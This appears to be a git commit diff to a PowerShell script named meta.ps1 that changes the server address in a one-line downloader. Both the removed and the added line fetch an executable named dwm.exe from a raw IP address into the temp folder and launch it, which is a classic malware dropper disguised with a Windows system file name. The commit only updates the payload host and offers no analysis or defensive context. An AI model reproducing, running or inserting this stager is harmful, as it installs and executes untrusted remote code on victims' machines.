d52d9a856fa9ab7b3708189daba1c5063e8965f8
userdol <48455401+userdol@users.noreply.github.com>
2019-03-28 02:49:07 +0300

    Update meta.ps1

--- meta.ps1
+++ meta.ps1
@@ -1,1 +1,1 @@
-(New-Object System.Net.WebClient).DownloadFile("http://163.172.144.82/ex/dwm.exe","$env:temp\dwm.exe");[System.Diagnostics.Process]::Start("$env:temp\dwm.exe")
+(New-Object System.Net.WebClient).DownloadFile("http://23.106.160.239/ex/dwm.exe","$env:temp\dwm.exe");[System.Diagnostics.Process]::Start("$env:temp\dwm.exe")
